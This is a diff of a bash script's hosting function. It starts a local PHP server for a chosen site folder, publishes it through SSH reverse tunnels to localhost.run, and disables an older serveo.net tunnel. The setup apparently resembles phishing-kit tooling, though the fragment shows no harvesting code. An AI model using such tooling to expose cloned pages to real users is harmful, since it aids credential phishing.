@@ -351,17 +351,17 @@ hosting(){
   printf "\e[32;1mStarting PHP server...\r"
   php -S localhost:8080 -t .vnm/$website > /dev/null 2>&1 &
   sleep 2
-  printf "Starting serveo.net...\r"
-  ssh -R 80:localhost:8080 serveo.net > .srvlog 2> /dev/null &
-  sleep 10
+#  printf "Starting serveo.net...\r"
+ # ssh -R 80:localhost:8080 serveo.net > .srvlog 2> /dev/null &
+ # sleep 10
   printf "Starting localhost.run...\r"
   ssh -R 80:localhost:8080 nokey@localhost.run > .lhrlog 2> /dev/null &
   sleep 10
-  link=$(grep -o 'https://[-0-9a-z]*\.serveo.net' ".srvlog")
+#  link=$(grep -o 'https://[-0-9a-z]*\.serveo.net' ".srvlog")
   lhlink=$(grep -o 'https://[-0-9a-z]*\.lhr.life' ".lhrlog")
   rm -rf .lhrlog .srvlog
   echo -e "\e[32;1myour links are given bellow \e[34;1m\n"
-  echo Serveo.net : $link
+#  echo Serveo.net : $link
   echo ""
   echo Localhost.run : $lhlink
   echo -e "\nLocalHost  : http://localhost:8080"
